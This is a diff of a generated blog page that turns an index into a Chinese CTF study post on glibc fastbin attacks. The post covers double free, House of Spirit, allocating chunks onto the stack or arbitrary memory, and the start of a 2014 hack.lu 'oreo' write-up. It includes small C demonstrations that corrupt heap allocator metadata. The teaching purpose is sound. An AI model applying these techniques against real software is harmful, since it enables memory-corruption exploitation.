@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="index,follow">
-  <link rel="canonical" href="http://example.com/"/>
+  
+  <link rel="canonical" href="http://example.com/2020/11/01/pwn_fastbin-attack/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,16 +34,23 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>x1ngg3's blog</title>
-  <meta name="keywords" content="">
-  <meta desc name="description" content="x1ngg3's blog - John Doe - x1ngg3's blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="x1ngg3&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <title>Fastbin Attack related - x1ngg3's blog</title>
+  <meta name="keywords" content="pwn,heap,House Of Spirit,null">
+  <meta desc name="description" content="我提莫的心态崩了啊 ಥ_ಥ - John Doe - x1ngg3's blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastbin Attack related">
+<meta property="og:url" content="http://example.com/2020/11/01/pwn_fastbin-attack/index.html">
 <meta property="og:site_name" content="x1ngg3&#39;s blog">
+<meta property="og:description" content="我提莫的心态崩了啊 ಥ_ಥ">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2020-10-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-27T13:11:38.761Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="House Of Spirit">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2100,7 +2107,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2165,7 +2172,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2432,202 +2439,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div id="l_body">
       <div id="l_cover">
   
-    
-      <div class="cover-wrapper  dock" id='full'>
-        
-  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
-
-<div class='cover-body'>
-  <div class='top'>
-    
-    
-      <p class="title">X1ngg3</p>
-    
-    
-  </div>
-  <div class='bottom'>
-    <div class='menu navigation'>
-      <div class='list-h'>
-        
-          
-            <a href="/v4/getting-started/"
-              
-              
-              active-action="action-v4getting-started">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
-            </a>
-          
-            <a href="/faqs/"
-              
-              
-              active-action="action-faqs">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f516.svg'><p>帮助</p>
-            </a>
-          
-            <a href="/examples/"
-              
-              
-              active-action="action-examples">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f396.svg'><p>示例</p>
-            </a>
-          
-            <a href="/contributors/"
-              
-              
-              active-action="action-contributors">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f389.svg'><p>社区</p>
-            </a>
-          
-            <a href="/archives/"
-              
-              
-              active-action="action-archives">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
-            </a>
-          
-            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
-              
-              
-              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
-            </a>
-          
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-        <div id="scroll-down"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
-      </div>
-    
-  
 </div>
 
       <div id="safearea">
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  
-  <section class="post-list">
-    
-      
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/02/atest/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/07/02/atest/"  itemprop="url">
-        test--
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>测试博客是否还活着</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-07-02T00:00:00+08:00">2022-07-02</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/test/">test</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/test/" itemprop="url"><span itemprop="name">test</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/07/02/atest/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/01/pwn_fastbin-attack/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="x1ngg3's blog">
@@ -2637,565 +2455,339 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/11/01/pwn_fastbin-attack/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         Fastbin Attack related
-      </a>
-    </h2>
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
   
-  <div class='md article-desc' itemprop="articleBody">
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/PWN/">PWN</a>
     
-      <p>我提莫的心态崩了啊 ಥ_ಥ</p>
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">2020-11-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
+
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Nov 1, 2020</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>我提莫的心态崩了啊 ಥ_ಥ</p>
+<span id="more"></span>
+
+<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
+<ol>
+<li>fastbin 的堆块被释放后 <strong>next_chunk 的 pre_inuse 位不会被清空</strong></li>
+<li>fastbin 在执行 free 的时候<strong>仅验证了 main_arena 直接指向的块</strong>，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
+</ol>
+<p>如下代码可以跳过<code>double free</code>检测：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="https://i.loli.net/2020/12/08/4J7rMzwoHXR2Kc8.png" class="lazyload" data-srcset="https://i.loli.net/2020/12/08/4J7rMzwoHXR2Kc8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201208222201746"></p>
+<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 </p>
+<p>也就是：main_arena&#x3D;&gt;chunk1&#x3D;&gt;chun2&#x3D;&gt;chunk1&#x3D;&gt;fd</p>
+<p>比如说对于如下代码，可以将chunk分配到bss段上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
+<p>该技术的核心在于在目标位置处伪造 fastbin chunk，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
+<p>有两个例子可以帮助理解，个人觉得第二个好理解一点：</p>
+<h4 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">   </span><br><span class="line">  <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack.n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.n&quot;</span>);</span><br><span class="line">         <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.n&quot;</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This region must contain two chunks. The first starts at %p and the second at %p.n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av-&gt;system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">9</span>] = <span class="number">0x2240</span>; <span class="comment">// nextsize</span></span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;</span>);</span><br><span class="line">        a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %pn&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h3><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
+<p>这里也就是在栈上构造出chunk的结构来骗过上帝，有时候是利用程序的流程来控制数据使符合chunk的结构。</p>
+<p><code>example</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 <strong>事实上只要满足目标地址存在合法的 size 域</strong>（<strong>这个 size 域是构造的，还是自然存在的都无妨</strong>），<strong>我们可以把 chunk 分配到任意的可写内存中</strong>，比如 bss、heap、data、stack 等等。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc">演示例子</a></p>
+<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p> 啊，怎么说呢挺难过的，还是有个地方没有弄懂是为什么，搜也搜不到（可能师傅们觉得这种简单地方应该没人不会吧(⑉･̆-･̆⑉)），我也不能一直在这里死磕浪费时间，就先这样吧。</p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>首先在<code>heap_bss</code>上保存了当前分配的堆的地址，<strong>这个地址在每次分配的时候都会更新</strong>。</p>
+<p>那程序是如何遍历这些chunk的呢，在每个chunk的<code>data+0x34</code>处保存了上一个chunk的地址，heap_bss上保存最新创建的chunk地址，以此来实现遍历。</p>
+<p>另外注意两次<code>gets</code>的大小都是56，而块的大小为<code>0x30</code>存在堆溢出。</p>
